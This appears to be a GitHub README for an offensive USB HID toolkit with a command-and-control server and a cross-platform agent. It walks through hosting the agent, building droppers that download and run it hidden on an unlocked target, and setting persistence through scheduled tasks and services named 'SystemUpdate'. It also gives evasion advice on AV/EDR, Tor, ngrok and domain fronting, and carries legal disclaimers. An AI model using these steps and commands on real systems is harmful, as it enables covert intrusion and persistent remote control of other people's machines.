![image](https://github.com/user-attachments/assets/d214504e-020e-4f74-a836-f5b84981dccd)

<div align="center">

```
╔═══════════════════════════════════════════════════════════════╗
║  ██████╗  █████╗ ██████╗ ██╗  ██╗███████╗███████╗ ██████╗     ║
║  ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔════╝██╔════╝     ║
║  ██║  ██║███████║██████╔╝█████╔╝ ███████╗█████╗  ██║          ║
║  ██║  ██║██╔══██║██╔══██╗██╔═██╗ ╚════██║██╔══╝  ██║          ║
║  ██████╔╝██║  ██║██║  ██║██║  ██╗███████║███████╗╚██████╗     ║
║  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝     ║
║      ███╗   ██╗██╗ ██████╗ ██╗  ██╗████████╗                  ║
║      ████╗  ██║██║██╔════╝ ██║  ██║╚══██╔══╝                  ║
║      ██╔██╗ ██║██║██║  ███╗███████║   ██║                     ║
║      ██║╚██╗██║██║██║   ██║██╔══██║   ██║                     ║
║      ██║ ╚████║██║╚██████╔╝██║  ██║   ██║                     ║
║      ╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝                     ║
║          ██████╗ ██╗      █████╗ ██████╗ ███████╗             ║
║          ██╔══██╗██║     ██╔══██╗██╔══██╗██╔════╝             ║
║          ██████╔╝██║     ███████║██║  ██║█████╗               ║
║          ██╔══██╗██║     ██╔══██║██║  ██║██╔══╝               ║
║          ██████╔╝███████╗██║  ██║██████╔╝███████╗             ║
║          ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝             ║
╚═══════════════════════════════════════════════════════════════╝
```

# **USB Army Knife Exploitation Framework**

### *"The blade that cuts through digital darkness"*

![Version](https://img.shields.io/badge/version-2.0-red.svg)
![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20macOS%20%7C%20Windows-blue.svg)
![License](https://img.shields.io/badge/license-MIT-green.svg)
![Status](https://img.shields.io/badge/status-Active-success.svg)

</div>

---

## 🗡️ Overview

A command-center for USB HID operations, payload crafting, wireless attack tooling, and a security‑hardened C2—designed to pair with **USB Army Knife** (LILYGO T‑Dongle S3) and other devices.

### Core Idea

NightBlade is your cockpit: build DuckyScripts, flash devices, deploy agents via HID droppers, and orchestrate targets through the integrated C2. Use the device's AP/WebUI (4.3.2.1:8080) to upload autorun DuckyScripts; the runtime agent then talks to NightBlade C2 over your chosen network path (direct or ngrok).

### ✨ Highlights

- ✅ Full GUI (`installer_gui.py`) + compact UI (`smallgui.py`) for small screens
- ✅ DuckyScript editor, syntax highlighting, linter, payload library
- ✅ WiFi/Bluetooth attack panels (scan, quick actions)
- ✅ Obfuscation and social‑engineering helpers
- ✅ Profiles, Serial monitor, eFuse tools, Dashboard analytics
- ✅ Security‑hardened C2 (Flask + WebSocket) with API keys, rate limiting, audit logging
- ✅ Cross‑platform agent (Linux/macOS/Windows) + ready‑made HID droppers
- ✅ **Windows persistence**: HKCU/Task/Service
- ✅ **Linux/macOS persistence**: systemd/LaunchAgent

### What NightBlade Is/Is Not

| ✅ **Is** | ❌ **Is Not** |
|-----------|---------------|
| A controller and toolkit for authorized security testing and research | A magical "USB autorun" bypass—modern Windows disables USB AutoRun |
| Enterprise-grade C2 with HID delivery Delivery is via HID keystrokes (DuckyScript) while the session is unlocked|  |

---

## 🚀 Quick Start (Local Dev)

### 1. Install Dependencies

```bash
# Clone repo (if not already)
git clone https://github.com/wickednull/DarkBlade.git
cd DarkBlade

# Create virtual environment
python3 -m venv venv
source venv/bin/activate  # Linux/macOS
# venv\Scripts\activate   # Windows

# Install requirements
pip install -r requirements.txt
```

### 2. Launch GUI

```bash
# Full GUI
python3 installer_gui.py

# Compact GUI (for small screens)
python3 smallgui.py
```

### 3. Start C2 Server

```bash
# Via GUI: navigate to C2 tab and click "Start C2"

# Or via CLI:
venv/bin/python c2_server/c2_server.py --port 8443

# Optional: enable ngrok for public access
# (configure in GUI C2 tab or pass --ngrok flag)
```

### 4. Validate C2

- Note the **"Master API Key"** displayed in GUI C2 tab
- Click **"Refresh Beacons"** (should be empty initially)
- C2 is ready when **"Server Status: Running"** shows

---

## 🤖 Agent Workflow (Recommended)

### Step 1: Build Agent

```bash
# Linux/macOS
pyinstaller -F -n db-agent agents/db_agent.py

# Windows (run on Windows build box)
pyinstaller -F -n db-agent.exe agents\db_agent.py
```

**Binaries output to:** `dist/db-agent` (or `dist/db-agent.exe`)

### Step 2: Host Binary

```bash
# Example: simple HTTP server
cd dist
python3 -m http.server 8000

# Or upload to your CDN/server
# Note the AGENT_URL, e.g.: http://192.168.1.100:8000/db-agent
```

### Step 3: Generate HID Dropper Payload

1. Open **GUI → Payload Library**
2. Select dropper template:
   - `Windows_Agent_Dropper.json` (HKCU Run)
   - `Windows_Agent_Dropper_Task.json` (Scheduled Task)
   - `Linux_Agent_Dropper.json` (systemd user service)
   - `MacOS_Agent_Dropper.json` (LaunchAgent)

3. **Fill variables:**
   - `AGENT_URL`: `http://YOUR_SERVER:8000/db-agent`
   - `C2_URL`: `http://YOUR_IP:8443` (or ngrok URL)
   - `JITTER`: `30` (seconds)
   - `SLEEP`: `60` (seconds)
   - `PROXY`: (optional, e.g., `http://proxy:8080`)

4. Save as `autorun.ds`

### Step 4: Deliver via USB Army Knife

```bash
# Option A: Upload via device AP/WebUI
# 1. Connect to device AP (SSID: USBArmy...)
# 2. Navigate to http://4.3.2.1:8080
# 3. Upload autorun.ds

# Option B: Copy to SD card
# Mount SD card and copy autorun.ds to root
```

**Plug device into unlocked target → dropper runs → agent beacons**

### Step 5: Verify Beacon

1. **GUI → C2 tab → Refresh Beacons**
2. Select beacon → Send command: `whoami`
3. View result in output panel

---

## 🔐 Persistence Options

### Windows

#### HKCU Run (No Elevation)
```
Registry: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Trigger: User logon
Privileges: User
```

#### User Scheduled Task (No Elevation)
```bash
schtasks /create /tn "SystemUpdate" /tr "C:\path\db-agent.exe" /sc ONLOGON /rl LIMITED
```
- **Trigger**: User logon
- **Privileges**: User

#### SYSTEM Scheduled Task (Requires UAC)
```bash
schtasks /create /tn "SystemUpdate" /tr "C:\path\db-agent.exe" /sc ONSTART /ru SYSTEM /rl HIGHEST
```
- **Trigger**: Boot
- **Privileges**: SYSTEM

#### Windows Service (Requires UAC)
```bash
sc create "SystemUpdate" binPath= "C:\path\db-agent.exe" start= auto
```
- **Trigger**: Boot
- **Privileges**: SYSTEM

---

### Linux

```bash
# Install systemd user service
chmod +x agents/linux/install.sh
./agents/linux/install.sh /path/to/db-agent http://C2_IP:8443

# Service runs at user login
systemctl --user status db-agent
```

---

### macOS

```bash
# Install LaunchAgent
chmod +x agents/macos/install_mac.sh
./agents/macos/install_mac.sh /path/to/db-agent http://C2_IP:8443

# Agent runs at user login
launchctl list | grep darkblade
```

---

## 🔧 USB Army Knife Integration

**Device AP/WebUI:** `4.3.2.1:8080`
- For uploading/managing DuckyScripts
- **NOT** the beacon communication path

### Workflow:
1. DuckyScript dropper (`autorun.ds`) executes on device plug-in
2. Opens shell (Win+R/Terminal)
3. Downloads agent from `AGENT_URL`
4. Jitters (random delay)
5. Runs agent hidden
6. Configures persistence
7. Agent beacons to `C2_URL` over LAN/WAN/ngrok

---

## 🛡️ Security & Legal

### ⚠️ LEGAL NOTICE

**DarkSec NIGHTBLADE** is designed exclusively for authorized security testing, penetration testing, and red team operations. **Unauthorized access to computer systems is illegal.**

- ✅ Obtain proper authorization before deployment
- ✅ DarkSec Labs assumes no liability for misuse
- ✅ Comply with all applicable laws and regulations

### OPSEC Considerations:

- Use jitter and variable sleep intervals
- Route traffic through proxies/Tor if needed
- Rotate API keys regularly
- Use ngrok or reverse proxies for obfuscation
- Minimize forensic artifacts (userland persistence preferred)
- Expect AV/EDR scrutiny; obfuscate/encrypt payloads as needed

---

## 🔍 Troubleshooting

### No Beacon Appears
- Verify `C2_URL` is reachable from target
- Check firewall/EDR blocking outbound connections
- Confirm `AGENT_URL` is correct and binary downloads
- For elevated droppers: ensure UAC prompt was accepted
- Check `c2_server/audit.log` for connection attempts

### Windows PowerShell Blocked
- Use Signed-PS dropper template with code-signed PS1 installer
- Or switch to cmd.exe based dropper

### Linux/macOS Agent Runs But No Beacon
- Check `DB_PROXY` environment variable
- Test egress: `curl -v http://C2_IP:8443`
- Review systemd/LaunchAgent logs

### GUI Scroll Issues
- Use `smallgui.py` for small screens
- Most panels support mousewheel/two-finger scroll

### Payload JSON Errors
- Ensure scripts are valid JSON with proper escaping
- Recent repo fixes address most JSON issues

---

## 📂 Files of Interest

| File | Description |
|------|-------------|
| `installer_gui.py` | Main GUI |
| `smallgui.py` | Compact small-screen GUI |
| `agents/db_agent.py` | Cross-platform agent (Python) |
| `agents/linux/*` | systemd user service + installer |
| `agents/macos/*` | LaunchAgent plist + installer |
| `payloads/*Agent_Dropper*.json` | HID droppers with jitter/proxy/persistence |
| `c2_server/c2_server.py` | C2 server (Flask + WebSocket) |

---

## 💡 Operational Tips

```bash
# Use ngrok for quick external C2 access
./ngrok http 8443
# Copy public URL to C2_URL variable

# Tune SLEEP/JITTER per engagement
# 60/30 is reasonable default (60s sleep, ±30s jitter)

# Windows persistence preference:
# 1. HKCU Run (quietest)
# 2. User Task (if registry monitored)
# 3. SYSTEM Task/Service (if elevation available)

# Test agent manually before HID deployment:
python3 agents/db_agent.py
# Or on Windows:
db-agent.exe

# Build optimized binary:
pyinstaller -F --onefile --windowed -n db-agent agents/db_agent.py
```

---

## 🗺️ Roadmap

- [ ] One-click "Build & Self-Test" in Agent tab
- [ ] PyInstaller integration + local run + beacon validation
- [ ] Expanded device support beyond USB Army Knife
- [ ] Optional encrypted transport (TLS/mTLS)
- [ ] Domain fronting presets for CDN-based C2

---

## 🙏 Credits

**Developed by DarkSec Labs**

Special thanks to:
- [i-am-shodan](https://github.com/i-am-shodan) and the [USBArmyKnife](https://github.com/i-am-shodan/USBArmyKnife) project for the incredible hardware foundation
- The ESP32 community
- DuckyScript developers
- Open source security researchers
- Red team operators worldwide

---

## ⚠️ Legal Disclaimer

```
╔═══════════════════════════════════════════════════════════════╗
║                    ⚠️  LEGAL DISCLAIMER                       ║
║                                                               ║
║  DarkSec NIGHTBLADE is designed exclusively for authorized    ║
║  security testing, penetration testing, and red team          ║
║  operations. Unauthorized access to computer systems is       ║
║  illegal.                                                     ║
║                                                               ║
║  Users must obtain proper authorization before deployment.    ║
║  DarkSec Labs and the developers assume no liability for      ║
║  misuse of this software.                                     ║
║                                                               ║
║  By using this tool, you agree to comply with all             ║
║  applicable laws and regulations.                             ║
╚═══════════════════════════════════════════════════════════════╝
```

---

<div align="center">

### **DarkSec NIGHTBLADE v2.0**  
*From DarkSec Labs - Forging the future of offensive security*

⚔️ **The blade that cuts through digital darkness** ⚔️

</div>
